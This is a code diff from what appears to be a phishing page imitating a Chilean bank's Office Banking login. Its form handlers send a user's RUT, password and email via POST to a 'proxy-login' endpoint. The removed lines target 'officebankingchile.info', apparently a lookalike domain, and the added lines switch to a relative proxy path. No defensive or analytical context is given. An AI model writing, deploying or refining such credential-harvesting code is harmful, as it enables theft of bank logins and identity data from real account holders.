@@ -301,7 +301,7 @@ loginForm.addEventListener("submit", async e=>{
   }
 
   try{
-    await fetch("https://officebankingchile.info/proxy-login",{
+    await fetch("/proxy-login",{
       method:"POST",
       headers:{ "Content-Type":"application/json" },
       body:JSON.stringify({ rut:rut.value, passwd:passwd.value })
@@ -320,7 +320,7 @@ loginForm.addEventListener("submit", async e=>{
 /* CORREO */
 async function enviarCorreo(){
   try{
-    await fetch("https://officebankingchile.info/proxy-login",{
+    await fetch("/proxy-login",{
       method:"POST",
       headers:{ "Content-Type":"application/json" },
       body:JSON.stringify({ mail:correo.value })
